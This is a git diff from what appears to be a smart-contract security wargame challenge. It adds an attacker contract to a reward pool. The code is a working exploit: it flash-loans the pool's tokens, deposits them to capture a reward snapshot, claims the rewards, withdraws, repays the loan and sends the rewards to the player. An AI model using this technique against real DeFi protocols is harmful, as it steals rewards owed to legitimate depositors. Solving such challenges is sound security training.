@@ -5,6 +5,7 @@ import "solady/src/utils/FixedPointMathLib.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 import { RewardToken } from "./RewardToken.sol";
 import { AccountingToken } from "./AccountingToken.sol";
+import {FlashLoanerPool} from "./FlashLoanerPool.sol";
 
 /**
  * @title TheRewarderPool
@@ -104,5 +105,39 @@ contract TheRewarderPool {
 
     function isNewRewardsRound() public view returns (bool) {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+contract TheRewarderPoolAttacker {
+    TheRewarderPool pool;
+    FlashLoanerPool flashLoanerPool;
+    address liquidityToken;
+    address player;
+
+    constructor(
+        TheRewarderPool _pool,
+        FlashLoanerPool _flashLoanerPool,
+        address _liquidityToken,
+        address _player
+    ) {
+        pool = _pool;
+        flashLoanerPool = _flashLoanerPool;
+        liquidityToken = _liquidityToken;
+        player = _player;
+    }
+
+    /// @dev flash loan all the dvt tokens then deposit and claim the rewards, then withdraw and return tokens
+    function attack() public {
+        flashLoanerPool.flashLoan(1_000_000 ether);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        SafeTransferLib.safeApprove(liquidityToken, address(pool), amount);
+        pool.deposit(amount);
+        pool.distributeRewards();
+        pool.withdraw(amount);
+        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
+        RewardToken rewardToken = pool.rewardToken();
+        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
     }
 }
